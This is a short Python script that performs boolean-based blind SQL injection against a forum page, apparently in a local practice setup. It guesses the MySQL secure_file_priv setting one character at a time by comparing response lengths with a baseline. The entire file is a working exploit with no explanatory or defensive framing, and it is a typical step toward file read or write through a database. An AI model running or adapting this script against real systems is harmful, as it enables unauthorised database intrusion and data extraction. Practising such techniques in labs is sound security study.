import requests


def get_path():
    base_url = 'http://localhost/forum/html/sql_injection_html.php?forumid=8'
    base_size = len(requests.get(base_url).text)
    all_word = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ. _0123456789<>?:{}"
    name = ""
    for j in range(1, 50):
        sign = 0
        for i in all_word:
            url = f"{base_url} and (SELECT SUBSTR(@@GLOBAL.secure_file_priv, {j}, 1) ='{i}')"
            if len(requests.get(url).text) == base_size:
                name += i
                sign = 1
                break
        if sign == 0:
            name += "\\"
    return name


print(get_path())
